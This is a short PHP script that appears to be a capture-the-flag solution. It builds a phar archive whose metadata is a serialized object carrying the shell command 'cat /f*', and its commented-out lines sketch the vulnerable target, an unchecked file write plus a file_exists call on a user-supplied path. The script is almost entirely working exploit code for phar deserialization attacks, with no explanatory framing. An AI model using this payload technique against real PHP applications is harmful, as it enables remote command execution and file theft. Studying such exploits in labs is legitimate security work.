<?php
class story{
   public $eating = 'cat /f*';
   public $God = 'true';
}                 
// if(isset($_GET['pear'])&&isset($_GET['apple'])){
//     // $Eden=new story();
//     $pear=$_GET['pear'];
//     $Adam=$_GET['apple'];
//     $file=file_get_contents('php://input');
//     file_put_contents($pear,urldecode($file));
//     file_exists($Adam);
// }
// else{
//     echo '多吃雪梨';
// }
// $file=file_get_contents('php://input');
// file_put_contents('shit',$file);
// $a = new ReflectionClass('story');
// $b = $a -> newInstanceWithoutConstructor();
// echo serialize($b);
// echo $b;

$phar = new Phar("1.phar");
$phar->startBuffering();
$phar->setStub("<php __HALT_COMPILER(); ?>");
$o = new story();
$phar->setMetadata($o);
$phar->addFromString("test.txt","test");
$phar->stopBuffering();
?>